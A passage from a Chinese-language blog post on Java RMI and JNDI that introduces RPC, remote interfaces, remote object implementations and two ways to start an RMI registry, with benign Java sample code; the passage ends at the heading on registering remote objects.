<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/08/25/java rmi & jndi/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Java RMI &amp; JNDI | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">57</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Java RMI &amp; JNDI</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-08-25 01:06:24</span>
        <span class="mobile">2025-08-25 01:06:24</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-10-08 00:28:40</span>
            <span class="mobile">2025-10-08 00:28:40</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/java-web/">java web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/java-web/">java web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>81.1k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>352 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="RMI（Remote-Method-Invocation）"><a href="#RMI（Remote-Method-Invocation）" class="headerlink" title="RMI（Remote Method Invocation）"></a>RMI（Remote Method Invocation）</h1><p><strong>RPC</strong>（Remote Procedure Call，远程过程调用）一种允许不同计算机上的程序之间通过网络进行通信并调用彼此的方法的技术。通过RPC，程序可以像调用本地函数一样调用远程的函数，隐藏了通信和网络的复杂性，使得分布式应用程序的开发变得更加简单。</p>
<p>RPC 的核心思想是：在分布式系统中，客户端通过调用远程服务器上的方法，获取远程服务的结果，而无需关注底层的网络通信和序列化等细节。RPC 框架负责将函数调用转换为网络请求，并处理请求的序列化、传输、反序列化等过程。</p>
<pre class="mermaid">sequenceDiagram
    participant Client
    participant Client_Stub
    participant Server_Stub
    participant Server
    
    
    Client->>Client_Stub: 1. 客户端调用
    activate Client
    activate Client_Stub
    Client_Stub->>Client_Stub: 2. 序列化
    Client_Stub->>Server_Stub: 3. 发送消息
    activate Server_Stub
    Server_Stub->>Server_Stub: 4. 反序列化
    Server_Stub->>Server: 5. 调用本地服务
    activate Server
    Server->>Server: 6. 服务处理
    Server-->>Server_Stub: 7. 返回处理结果
    deactivate Server
    Server_Stub->>Server_Stub: 8. 将结果序列化
    Server_Stub-->>Client_Stub: 9. 返回消息
    deactivate Server_Stub
    Client_Stub->>Client_Stub: 10. 反序列化
    Client_Stub-->>Client: 11. 返回调用结果
    deactivate Client_Stub
    deactivate Client</pre>

<p>Java RMI（远程方法调用）是 Java 平台提供的一种机制，它允许 Java 程序在不同的 JVM（Java虚拟机）上进行通信，并能够像调用本地对象一样调用远程对象的方法。RMI 是 Java  中分布式应用的基础技术之一，它封装了网络通信、序列化等复杂的底层实现，允许开发者专注于应用逻辑的实现。</p>
<p>Java RMI 允许客户端通过存根（Stub）对象，调用在远程 JVM 中的真实对象的方法。RMI 不仅支持<strong>方法调用的远程执行</strong>，还支持在<strong>不同机器之间传输对象</strong>。</p>
<h2 id="RMI的主要组件"><a href="#RMI的主要组件" class="headerlink" title="RMI的主要组件"></a>RMI的主要组件</h2><h3 id="远程接口（Remote-Interface）"><a href="#远程接口（Remote-Interface）" class="headerlink" title="远程接口（Remote Interface）"></a>远程接口（Remote Interface）</h3><p>远程接口定义了可以在远程调用中使用的方法，客户端和服务端都需定义用于远程调用的接口。远程接口必须满足下面两个要求：</p>
<ul>
<li>远程接口需要继承自 <code>java.rmi.Remote</code>。</li>
<li>远程接口的每个方法必须声明抛出 <code>java.rmi.RemoteException</code> 异常。</li>
</ul>
<p>下面是一个简单的远程接口示例：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(Object s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    String <span class="title function_">sayGoodBye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="远程对象实现类（Remote-Object-Implementation）"><a href="#远程对象实现类（Remote-Object-Implementation）" class="headerlink" title="远程对象实现类（Remote Object Implementation）"></a>远程对象实现类（Remote Object Implementation）</h3><p>服务端的远程对象实现类需要实现远程接口，且<strong>需要继承 <code>java.rmi.server.UnicastRemoteObject</code> 类</strong> 。<code>UnicastRemoteObject</code> 类提供了将远程对象注册到 RMI 注册中心的方法，方便自动将这个远程对象导出供客户端调用。下面是一个简单的远程对象实现类示例：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sayHello Called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayGoodBye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sayGoodbye Called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bye~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当然远程对象实现类也可以不继承 <code>UnicastRemoteObject</code>，但需要手动调用 <code>UnicastRemoteObject#exportObject</code> 来导出该远程对象，使其成为可被客户端调用的远程对象。导出对象时可以指定监听端口来接收 <code>incoming calls</code>，默认为随机端口。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHello</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="comment">// 手动导出对象</span></span><br><span class="line">        UnicastRemoteObject.exportObject(<span class="built_in">this</span>, <span class="number">1099</span>);  <span class="comment">// 可以指定端口</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sayHello Called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayGoodBye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sayGoodBye Called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bye~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="存根（Stub）和骨架（Skeleton）"><a href="#存根（Stub）和骨架（Skeleton）" class="headerlink" title="存根（Stub）和骨架（Skeleton）"></a>存根（Stub）和骨架（Skeleton）</h3><p>为屏蔽网络通信的复杂性，RMI引入两个概念，客户端<strong>存根（Stub）</strong>和服务端<strong>骨架（Skeleton）</strong> 。</p>
<ul>
<li><strong>存根（Stub）</strong> ： 存根是客户端访问远程对象的代理。当客户端调用远程方法时，存根将方法调用封装并通过网络发送到远程服务器。</li>
<li><strong>骨架（Skeleton）</strong> ： 骨架是服务器端的组件，用于接收客户端请求，并将请求传递给真实的远程对象执行。在JDK 5.0之后，骨架不再被需要，因为JDK使用动态代理来处理远程调用。</li>
</ul>
<h3 id="RMI-注册中心（RMI-Registry）"><a href="#RMI-注册中心（RMI-Registry）" class="headerlink" title="RMI 注册中心（RMI Registry）"></a>RMI 注册中心（RMI Registry）</h3><p>RMI 注册中心用于管理和查找远程对象，它监听一个端口（默认是 1099）并提供远程对象查找服务。</p>
<ul>
<li><strong>远程对象</strong>可以通过注册中心进行<strong>查找</strong>和<strong>绑定</strong> 。</li>
<li><strong>客户端</strong>通过 RMI 注册中心来<strong>查找远程对象</strong> 。</li>
</ul>
<h4 id="启动-RMI-注册中心"><a href="#启动-RMI-注册中心" class="headerlink" title="启动 RMI 注册中心"></a>启动 RMI 注册中心</h4><p>RMI 注册中心主要有两种启动方式：</p>
<ul>
<li><p>通过 <code>rmiregistry</code> 命令启动（独立进程方式）</p>
</li>
<li><p>通过 <code>LocateRegistry.createRegistry()</code> 启动（程序内启动方式）</p>
</li>
</ul>
<p>通过 <code>rmiregistry</code> 命令启动 RMI 注册中心是传统的启动方法，你需要在终端或命令行中运行 <code>rmiregistry</code> 命令手动启动一个独立的 RMI 注册中心进程，它会监听一个端口（默认是 1099），并等待客户端进行连接和查找远程对象。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmiregistry</span><br></pre></td></tr></table></figure></div>

<p>默认情况下，<code>rmiregistry</code> 会监听端口 1099。如果你希望 RMI 注册中心监听一个不同的端口，可以指定端口号，例如：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmiregistry 2000</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li>需要确保在 <strong>启动服务端程序之前</strong> 启动 RMI 注册中心。因为服务端会将远程对象注册到注册中心中，注册中心必须在此之前启动。</li>
<li>启动 <code>rmiregistry</code> 后，它会在终端持续运行并监听指定端口（默认是 1099）。在这个终端窗口中，你看不到任何提示，直到你停止它。</li>
<li>在使用 <code>rmiregistry</code> 时，通常建议将它放在单独的终端窗口或后台运行，以便它能够持续监听客户端的请求。</li>
</ul>

    </div>
  </div>

<p>另一种启动 RMI 注册中心的方式是通过 <code>LocateRegistry.createRegistry()</code> 启动 RMI 注册中心。这种方式通过 Java 代码在程序内部启动 RMI 注册中心。<code>LocateRegistry.createRegistry()</code> 方法可以在代码中指定端口号，并启动一个嵌入式的 RMI 注册中心。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建并启动 RMI 注册中心，监听 1099 端口</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;RMI registry is running.&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 你的远程对象实例化代码和绑定远程对象的代码</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>LocateRegistry.createRegistry()</code> 启动方式主要应用于开发和测试环境中。我们通常会直接把 RMI 启动部分放到服务端中，而不依赖外部的 <code>rmiregistry</code> 命令，这样可以简化调试和部署过程。</p>

    </div>
  </div>

<h4 id="服务端注册远程对象"><a href="#服务端注册远程对象" class="headerlink" title="服务端注册远程对象"></a>服务端注册远程对象</h4><p>远程对象需要在服务器端注册到 RMI 注册中心中，这样客户端才能通过注册中心查找到远程对象并进行方法调用。</p>
